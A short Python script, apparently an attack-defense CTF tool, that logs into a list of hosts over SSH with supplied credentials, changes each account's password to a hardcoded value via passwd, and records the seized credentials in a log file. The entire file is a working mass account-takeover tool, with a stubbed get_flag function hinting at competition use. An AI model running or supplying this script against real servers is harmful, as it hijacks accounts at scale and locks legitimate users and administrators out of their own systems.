import paramiko
import sys

ssh_clients = []
timeout = 5
new_password = "n3w_p4ssw0rd"


def get_flag():
    pass


class SSH_Client():
    def __init__(self, host, port, username, password):
        self.is_root = False
        self.host = host
        self.port = port
        self.username = username
        self.password = password
        self.ssh = paramiko.SSHClient()
        self.ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        self.ssh.connect(self.host, self.port, self.username, self.password, timeout=timeout)

    def exec_command(self, command):
        stdin, stdout, stderr = self.ssh.exec_command(command)
        return stdin, stdout, stderr

    def change_password(self):
        stdin, stdout, stderr = self.exec_command("passwd")
        if self.username != "root":
            stdin.write("%s\n" % self.password)
        stdin.write("%s\n" % new_password)
        stdin.write("%s\n" % new_password)
        stdout.read()
        if "success" in stderr.read().decode('utf-8'):
            self.password = new_password
            return True
        else:
            return False

    def save_log(self, filename):
        with open(filename, "a+") as f:
            f.write("%s %s %s %s\n" % (self.host, self.port, self.username, self.password))

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage:")
        print("\t python %s [FILENAME]" % (sys.argv[0]))
        exit(1)
    filename = sys.argv[1]
    print(" [+] Loading file : %s" % filename)
    with open(filename) as f:
        for line in f:
            line = line.rstrip("\n")
            data = line.split(" ")
            host = data[0]
            port = int(data[1])
            username = data[2]
            password = data[3]
            print(" [+] Trying login : %s" % host)
            try:
                ssh_client = SSH_Client(host, port, username, password)
            except Exception as e:
                print(" [-] %s" % e)
                continue
            ssh_clients.append(ssh_client)
    print(" [+] Login finished. ")
    print(" [+} Got [%d] clients. " % len(ssh_clients))
    if len(ssh_clients) == 0:
        exit()
    print(" [+] Starting changing password. ")
    for ssh_client in ssh_clients:
        if ssh_client.change_password():
            print(" [+] %s (Success!)" % ssh_client.host)
            ssh_client.save_log("success.log")
        else:
            print(" [+] %s (Failed!)" % ssh_client.host)
